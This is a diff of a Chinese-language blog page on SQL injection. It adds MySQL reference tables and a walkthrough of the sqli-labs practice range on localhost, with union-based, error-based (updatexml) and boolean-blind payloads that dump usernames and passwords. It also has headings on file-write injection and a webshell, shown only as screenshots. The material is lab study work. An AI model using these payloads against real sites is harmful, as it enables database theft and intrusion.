@@ -7,18 +7,44 @@
   
   <title>SQL注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="目录   1、原理 1.1什么是WEB 1.2 WEB技术分类 1.2.1前端 1.2.2中端 1.2.3后端   1.3什么是数据库 1.4SQL注入原理 1.4.1字符串内联注入 1.4.2数字值内联注入 1.4.3终止式SQL注入 1.4.4堆叠查询        [toc] 1、原理1.1什么是WEBWEB是建立在Internet上的一种网络服务，为浏览者在Internet上查找和浏览信息">
+  <meta name="description" content="目录   1、原理 1.1什么是WEB 1.2 WEB技术分类 1.2.1前端 1.2.2中端 1.2.3后端   1.3什么是数据库 1.4SQL注入原理 1.4.1字符串内联注入 1.4.2数字值内联注入 1.4.3终止式SQL注入 1.4.4堆叠查询     2、 信息收集 文件读写 url编码   3、 MySQL information_schema库     4、sqli-labs-m">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入">
 <meta property="og:url" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="目录   1、原理 1.1什么是WEB 1.2 WEB技术分类 1.2.1前端 1.2.2中端 1.2.3后端   1.3什么是数据库 1.4SQL注入原理 1.4.1字符串内联注入 1.4.2数字值内联注入 1.4.3终止式SQL注入 1.4.4堆叠查询        [toc] 1、原理1.1什么是WEBWEB是建立在Internet上的一种网络服务，为浏览者在Internet上查找和浏览信息">
+<meta property="og:description" content="目录   1、原理 1.1什么是WEB 1.2 WEB技术分类 1.2.1前端 1.2.2中端 1.2.3后端   1.3什么是数据库 1.4SQL注入原理 1.4.1字符串内联注入 1.4.2数字值内联注入 1.4.3终止式SQL注入 1.4.4堆叠查询     2、 信息收集 文件读写 url编码   3、 MySQL information_schema库     4、sqli-labs-m">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917221039225.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917002550128.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917124133009.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917132948580.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917133329402.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917133646711.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917134340353.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917134941454.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135242068.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135448500.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135907264.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917140925082.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917141601494.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917184630468.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917190731539.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192200527.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192322970.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192649852.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917193535643.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192853787.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917195648341.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917201507478.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917203508996.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917204715306.png">
+<meta property="og:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917205752962.png">
 <meta property="article:published_time" content="2023-02-23T07:20:57.000Z">
-<meta property="article:modified_time" content="2023-03-09T14:16:55.044Z">
+<meta property="article:modified_time" content="2023-09-17T15:00:43.740Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="WEB">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917221039225.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -108,6 +134,34 @@
 <li><a href="#144%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2">1.4.4堆叠查询</a></li>
 </ul>
 </li>
+</ul>
+</li>
+<li><a href="#2">2、</a><ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99">文件读写</a></li>
+<li><a href="#url%E7%BC%96%E7%A0%81">url编码</a></li>
+</ul>
+</li>
+<li><a href="#3">3、</a><ul>
+<li><a href="#mysql">MySQL</a><ul>
+<li><a href="#information_schema%E5%BA%93">information_schema库</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#4-sqli-labs-master%E9%9D%B6%E5%9C%BA">4、sqli-labs-master靶场</a><ul>
+<li><a href="#level1-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B">Level1 单引号字符型</a></li>
+<li><a href="#level2-get%E6%95%B4%E5%9E%8B">Level2 GET整型</a></li>
+<li><a href="#level3-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2">Level3 单引号变形</a></li>
+<li><a href="#level4-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B">Level4 双引号字符型</a></li>
+<li><a href="#level5-%E7%9B%B2%E6%B3%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">Level5 盲注/报错注入</a></li>
+<li><a href="#level6-%E4%B8%8E%E4%B8%8A%E9%A2%98%E7%9B%B8%E5%90%8C%E9%97%AD%E5%90%88%E4%B8%8D%E5%90%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88">Level6 与上题相同，闭合不同双引号闭合</a></li>
+<li><a href="#level7-%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5">Level7 基于文件写入</a></li>
+<li><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">一句话木马</a></li>
+<li><a href="#level8-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">Level8 布尔盲注</a></li>
+<li><a href="#level9-10-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">Level9 -10 时间盲注</a></li>
+<li><a href="#level11post%E4%BC%A0%E5%8F%82">Level11Post传参</a></li>
+<li><a href="#level15">Level15</a></li>
 </ul>
 </li>
 </ul>
@@ -413,7 +467,210 @@
 </tr>
 </tbody></table>
 <h3><span id="144堆叠查询">1.4.4堆叠查询</span></h3><p>指的是在单个数据库连接中执行多个查询序列。</p>
+<h1><span id="2">2、</span></h1><h2><span id="信息收集">信息收集</span></h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>@@version_compile_os</td>
+</tr>
+<tr>
+<td>数据库版本</td>
+<td>version()</td>
+</tr>
+<tr>
+<td>数据库名</td>
+<td>database()</td>
+</tr>
+<tr>
+<td>数据库用户</td>
+<td>user()</td>
+</tr>
+<tr>
+<td>数据库安装路径</td>
+<td>@@basedir</td>
+</tr>
+<tr>
+<td>拼接</td>
+<td>group_concat(@@version_compile_os,’ | ‘,version(),’ | ‘,@@basedir )</td>
+</tr>
+<tr>
+<td></td>
+<td>group_concat(database(),’ | ‘,user())</td>
+</tr>
+</tbody></table>
+<h2><span id="文件读写">文件读写</span></h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>load_file(‘路径’)</td>
+<td>读取</td>
+</tr>
+<tr>
+<td>into outfile 或者into dumpfile</td>
+<td>写入</td>
+</tr>
+</tbody></table>
+<h2><span id="url编码">url编码</span></h2><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>编码值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>#</td>
+<td>%23</td>
+</tr>
+<tr>
+<td>–空格</td>
+<td>–%20</td>
+</tr>
+<tr>
+<td>–+</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1><span id="3">3、</span></h1><h2><span id="mysql">MySQL</span></h2><h3><span id="information_schema库">information_schema库</span></h3><table>
+<thead>
+<tr>
+<th>表名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>information_schema.schemata</td>
+<td>记录所有库名的表</td>
+</tr>
+<tr>
+<td>information_schema.tables</td>
+<td>记录所有表名的表</td>
+</tr>
+<tr>
+<td>information_schema.columns</td>
+<td>记录所有字段名的表</td>
+</tr>
+</tbody></table>
+<h4><span id="schemata表">schemata表</span></h4><table>
+<thead>
+<tr>
+<th>字段名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>schema_name</td>
+<td>数据库名</td>
+</tr>
+</tbody></table>
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917221039225.png" alt="image-20230917221039225"></p>
+<h4><span id="tables表">tables表</span></h4><table>
+<thead>
+<tr>
+<th>列名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>数据库名称</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>表名</td>
+</tr>
+</tbody></table>
+<h4><span id="columns表">columns表</span></h4><table>
+<thead>
+<tr>
+<th>列名</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>数据库名</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>表名</td>
+</tr>
+<tr>
+<td>column_name</td>
+<td>列名</td>
+</tr>
+</tbody></table>
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917002550128.png" alt="image-20230917002550128"></p>
+<h1><span id="4-sqli-labs-master靶场">4、sqli-labs-master靶场</span></h1><h3><span id="level1-单引号字符型">Level1 单引号字符型</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917124133009.png" alt="image-20230917124133009"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="存在注入点判断">存在注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;	#回显错误</span></span><br></pre></td></tr></table></figure>
 
+<p>单引号报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/</span><br><span class="line">?id=1&#x27; --+回显正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917132948580.png" alt="image-20230917132948580"></p>
+<h5><span id="字段数判断">字段数判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+  #回显正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+  #回显正常</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+  #回显正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+  #回显错误</span></span><br><span class="line"><span class="comment">-------------------&gt;字段数为3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917133329402.png" alt="image-20230917133329402"></p>
+<h5><span id="判断回显位置">判断回显位置</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;	#id不存在，不回显</span></span><br><span class="line"><span class="string">union select 1,2,3 --+ #回显位置</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917133646711.png" alt="image-20230917133646711"></p>
+<p>回显位置为2、3</p>
+<h5><span id="信息收集">信息收集</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,</span></span><br><span class="line"><span class="string">group_concat(@@version_compile_os,&#x27;</span><span class="operator">|</span><span class="string">&#x27;,version()),  #操作系统 | 数据版本</span></span><br><span class="line"><span class="string">group_concat(database(),&#x27;</span> <span class="operator">|</span> <span class="string">&#x27;,user()) --+	#数据库名称 | 用户名</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917134340353.png" alt="image-20230917134340353"></p>
+<h5><span id="查看数据库数据">查看数据库数据</span></h5><h6><span id="查表名">查表名</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,</span></span><br><span class="line"><span class="string">group_concat(table_name) from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917134941454.png" alt="image-20230917134941454"></p>
+<h6><span id="查列名字段名">查列名（字段名）</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,</span></span><br><span class="line"><span class="string">group_concat(column_name) from information_schema.columns </span></span><br><span class="line"><span class="string">where table_schema = database() </span></span><br><span class="line"><span class="string">	and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135242068.png" alt="image-20230917135242068"></p>
+<h6><span id="查数据">查数据</span></h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,</span></span><br><span class="line"><span class="string">group_concat(id,&#x27;</span><span class="comment">--&#x27;,username,&#x27;--&#x27;,password) from users --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135448500.png" alt="image-20230917135448500"></p>
+<h3><span id="level2-get整型">Level2 GET整型</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917135907264.png" alt="image-20230917135907264"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-2</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>	#回显正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;	#回显错误</span></span><br><span class="line"><span class="string">?id=1 and 1=1 --+	#回显正常</span></span><br><span class="line"><span class="string">?id=1 and 1=2 --+	#无回显</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*后续不需要单引号闭合*/</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="level3-单引号变形">Level3 单引号变形</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917140925082.png" alt="image-20230917140925082"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and 1=1 --+ #回显正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ #无回显</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="level4-双引号字符型">Level4 双引号字符型</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917141601494.png" alt="image-20230917141601494"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-4</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=2--+	#报错</span><br><span class="line">?id=1&quot;) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+	#不回显</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=1--+	#正常回显</span><br></pre></td></tr></table></figure>
+
+<h3><span id="level5-盲注报错注入">Level5    盲注/报错注入</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917184630468.png" alt="image-20230917184630468"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>	#回显正常	成功执行</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>	#回显正常	成功执行</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2	#回显报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+	#无回显</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+	#回显成功 </span></span><br></pre></td></tr></table></figure>
+
+<h5><span id="字段数判断">字段数判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+	#报错</span></span><br><span class="line"><span class="string">字段数为3</span></span><br></pre></td></tr></table></figure>
+
+<h5><span id="使用updatexml函数">使用updatexml()函数</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--+#爆库名</span></span><br><span class="line"><span class="string">#0x7e是 ~</span></span><br><span class="line"><span class="string">替换中间select语句进行查询</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917190731539.png" alt="image-20230917190731539"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (updatexml(1,</span></span><br><span class="line"><span class="string">concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),0x7e),1))--+</span></span><br><span class="line"><span class="string">一次输出一行，依次替换limit x,1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192200527.png" alt="image-20230917192200527"></p>
+<h4><span id="总结">总结</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192322970.png" alt="image-20230917192322970"></p>
+<h3><span id="level6-与上题相同闭合不同双引号闭合">Level6 与上题相同，闭合不同双引号闭合</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192649852.png" alt="image-20230917192649852"></p>
+<h3><span id="level7-基于文件写入">Level7 基于文件写入</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917193535643.png" alt="image-20230917193535643"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="判断注入点">判断注入点</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> #回显，提示outfile</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; #报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>)) #回显，提示outfile</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and 1=1	#回显，提示outfile</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>)) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>	#不回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192853787.png" alt="image-20230917192853787"></p>
+<h3><span id="一句话木马">一句话木马</span></h3><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917195648341.png" alt="image-20230917195648341"></p>
+<h3><span id="level8-布尔盲注">Level8 布尔盲注</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917201507478.png" alt="image-20230917201507478"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;	#回显错误</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>	#回显正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2	#无回显</span></span><br></pre></td></tr></table></figure>
+
+<h5><span id="爆破">爆破</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span>s<span class="string">&#x27;=left(database(),1)--+ 页面正常 说明第一个字母为s</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917203508996.png" alt="image-20230917203508996"></p>
+<h3><span id="level9-10-时间盲注">Level9 -10 时间盲注</span></h3><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917204715306.png" alt="image-20230917204715306"></p>
+<h3><span id="level11post传参">Level11Post传参</span></h3><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917205752962.png" alt="image-20230917205752962"></p>
+<h3><span id="level15">Level15</span></h3>
       
     </div>
     <footer class="article-footer">
@@ -478,7 +735,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li></ul>
